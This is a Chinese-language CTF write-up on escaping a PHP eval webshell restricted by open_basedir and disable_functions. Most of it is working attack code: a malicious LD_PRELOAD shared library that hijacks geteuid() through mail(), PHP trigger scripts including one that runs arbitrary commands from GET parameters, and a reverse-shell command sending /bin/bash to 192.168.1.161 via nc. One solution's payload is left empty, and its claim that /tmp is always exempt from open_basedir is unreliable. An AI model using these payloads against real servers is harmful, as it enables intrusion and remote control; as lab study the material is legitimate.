## 题目

```php
ini_set('open_basedir', '/www/admin/localhost_81/wwwroot/class02'.$dir);
error_reporting(0);

if (isset($_POST['cmd'])){
	$cmd = $_POST['cmd'];
	if ($cmd){
		eval($cmd);
	} else {
		echo "给你留个后门又怎样？能拿到我根目录下的flag吗？";
	}
}
```

### 解析

- 本质是POST型PHP一句话后门，密码为`cmd`，可通过蚁剑正常连接
    
- 关键限制1：`open_basedir`限制目录访问，仅允许访问`class02`文件夹及根目录下`/tmp`文件夹
    
- 关键限制2：`disable_functions`禁用了绝大多数命令执行函数
    
- 核心考点：突破`open_basedir`限制，利用可用函数执行系统命令，读取根目录flag


## 五种种绕过解法（基于LD_PRELOAD+mail函数）

- 核心原理：
	利用`mail()`函数会调用外部程序`/usr/sbin/sendmail`，该程序会加载动态链接库；通过LD_PRELOAD加载自定义恶意`.so`文件，劫持系统函数（如`geteuid()`），执行命令。

- 通用操作：
	所有解法均需将`.c`文件编译为`.so`动态库，与PHP脚本一起通过蚁剑上传至`class02`目录，访问PHP脚本触发执行。

```mermaid
A[mail函数] --> B[调用子程序 &quot;/usr/sbin/sendmail&quot;] 
B --> C[调用动态链接库getuid函数]
```

### 解法一：直接读取flag到/tmp目录（简单直接）

#### 1. 编写恶意C代码（demo.c）

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload(){
	// 将flag内容写入/tmp/flag文件
	system("cat /flag > /tmp/flag");
}

int geteuid(){
	unsetenv("LD_PRELOAD"); // 清除环境变量，避免冲突
	payload();
}
```

#### 2. 编译生成动态库

```bash
gcc -shared -fPIC demo.c -o demo.so
```

#### 3. 编写PHP触发脚本（demo.php）

```php
<?php
putenv("LD_PRELOAD=./demo.so"); // 加载自定义恶意动态库
mail('','','',''); // 触发mail函数，调用sendmail，加载.so文件
?&gt;
```

#### 4. 执行步骤与结果

1. 上传`demo.so`和`demo.php`到`class02`目录
    
2. 浏览器访问`demo.php`，触发命令执行
    
3. 通过蚁剑访问`/tmp/flag`，即可查看flag


#### 弊端

执行一次命令需重新编写、编译、上传`.so`文件，操作繁琐。

### 解法二：反弹shell（灵活可控）

#### 1. 编写恶意C代码（demo.c）

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload(){
	// 反弹shell到kali主机（IP和端口需修改为自己的kali信息）

}

int geteuid(){
	unsetenv("LD_PRELOAD");
	payload();
}
```

#### 2. 编译生成动态库（同解法一）

```bash
gcc -shared -fPIC demo.c -o demo.so
```

#### 3. 编写PHP触发脚本（同解法一，demo.php）

#### 4. 执行步骤

1. kali中执行监听命令：`nc -lvp 7777`
    
2. 上传`demo.so`和`demo.php`到`class02`目录
    
3. 浏览器访问`demo.php`，触发反弹shell
    
4. kali中获得shell后，执行`cat /flag`查看flag

### 解法三：通过环境变量动态执行命令（最优解）

核心优势：无需重复编译`.so`文件，可通过GET参数动态传入命令，灵活执行各类操作。

#### 1. 编写恶意C代码（demo.c）

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int geteuid(){
	// 从环境变量EVIL_CMDLINE中读取要执行的命令
	const char* cmdline = getenv("EVIL_CMDLINE");
	if (getenv("LD_PRELOAD") == NULL) return 0;
	unsetenv("LD_PRELOAD");
	system(cmdline); // 执行命令
}
```

#### 2. 编译生成动态库（同前）

```bash
gcc -shared -fPIC demo.c -o demo.so
```

#### 3. 编写PHP触发脚本（demo.php）

```php
<?php
$cmd = $_GET["cmd"]; // 传入要执行的命令
$out_path = $_GET["outpath"]; // 命令输出保存路径（建议/tmp下）
// 将命令执行结果（含错误信息）保存到指定路径
$evil_cmdline = $cmd.">".$out_path."2>&1"; 
echo "<br/><b>cmdline:</b>".$evil_cmdline; // 回显执行的命令
putenv("EVIL_CMDLINE=".$evil_cmdline); // 将命令写入环境变量

$so_path = $_GET["sopath"]; // .so文件路径
putenv("LD_PRELOAD=".$so_path);
mail('','','',''); // 触发执行

// 读取输出文件内容，在网页上显示（支持换行）
echo "<br/><b>output:</b><br/>".nl2br(file_get_contents($out_path));
?>
```

#### 4. 执行步骤

1. 上传`demo.so`和`demo.php`到`class02`目录
    
2. 浏览器访问触发命令（示例）： `?cmd=cat /flag&outpath=/tmp/flag&sopath=./demo.so`
    
3. 网页直接显示flag内容，无需查看源代码或/tmp目录

### 解法四：通过可能存在的`pcnt_exec()函数`

1. 先在kali中通过`nc -lvp 7777`开启监听

2. 在靶场中通过post提交`cmd=pcnt_exec("/bin/bash", array("-c", "nc 192.168.1.161 7777 -e /bin/bash"));`

3. 随后即可通过反弹shell，查看flag

### 解法五：利用蚁剑插件，几乎无脑


1. 通过蚁剑连接上post后门

2. 随后在蚁剑首页右击该数据条

3. 点击加载插件，选择辅助工具中的绕过`disable_functions`

4. 进入页面后，在选择模式下拉表中，选择`LD_PRELOAD`或`PHP7_GC_UAF`，随后选择开始即可

## Q&A

### Q：为什么/tmp文件夹不受open_basedir限制？

A：

核心结论：
- /tmp是PHP官方默认放行的例外目录，无论如何设置open_basedir，均不受限制

why
- PHP会话（session）、文件上传临时文件、各类缓存等，均需读写这些临时目录，若限制则会导致PHP崩溃。

so在本题中实际可访问的目录：
- `/www/xxx/class02` 
-  `/tmp`
- `/var/tmp`
- `/usr/tmp`

`/tmp`是唯一不受限制的可操作目录，可作为跳板：上传文件、写入木马、执行命令、读取flag。


open_basedir仅限制PHP文件函数，不限制系统命令！

- 受限制的函数（无法直接读取根目录文件）
	- `file_get_contents()`、`include()`、`fread()`等
	- `不成功echo file_get_contents('/flag');`
- 不受限制的操作：
	- `system()`、`exec()`等系统命令，及基于命令执行的绕过操作
	- `成功system('cat /flag');`


### Q：nl2br()函数

A：
what？
- **nl2br = new line to break**，即「将换行符转换为HTML换行标签」
why？
- Linux命令执行的输出（如`ls`、`cat`）是纯文本，换行用`\n`表示
- 浏览器不识别`\n`，会将所有内容挤在一行，无法正常查看
- `nl2br()`将`\n`替换为`<br>`，让网页显示时正常换行
desp：
- 无nl2br()：命令输出全部拼接成一行，可读性极差
- 有nl2br()：命令输出按原格式分行显示，清晰易读
